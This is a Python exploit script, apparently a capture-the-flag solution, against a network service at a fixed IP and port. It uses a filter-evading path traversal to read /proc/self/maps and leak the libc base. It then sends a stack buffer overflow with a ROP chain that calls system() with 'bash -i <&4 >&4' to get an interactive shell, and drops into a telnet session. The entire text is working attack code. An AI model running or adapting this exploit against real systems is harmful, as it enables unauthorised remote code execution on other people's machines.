#!/usr/bin/python
import struct
import socket
import telnetlib
import time

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

def make_conn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('54.178.144.54', 7777))
    return s, s.makefile('rw', bufsize=0)

_, f = make_conn()
f.write('/../../../proc/self/maps\n'.replace('../', '....//'))
proc_maps = f.read()

libc_base = None
for l in proc_maps.split('\n'):
    if 'libc' in l:
        libc_base = int(l.split('-')[0], 16)
        break

print 'libc_base =', hex(libc_base)

system = libc_base + 0x3e360
#system = libc_base + 0x00040190

s, f = make_conn()
f.write('/\t0\n')

slash = 0x80498E4
recv = 0x080488C0
pop_ret = 0x080496A2
pop4_ret = 0x804963c
bss = 0x804AD4C

payload = 'A' * 0x414
payload += p(slash)
payload = payload.ljust(0x428, 'A')
payload += p(pop_ret)
payload += p(4)
payload += p(recv)
payload += p(pop4_ret)
payload += p(4)
payload += p(bss)
payload += p(16)
payload += p(0)
payload += p(system)
payload += 'AAAA'
payload += p(bss)
f.write(payload)

time.sleep(1)
f.write('bash -i <&4 >&4'.ljust(16, '\0'))
f.write("""python -c 'import pty; pty.spawn("/bin/sh")'\n""")

t = telnetlib.Telnet()
t.sock = s
t.interact()
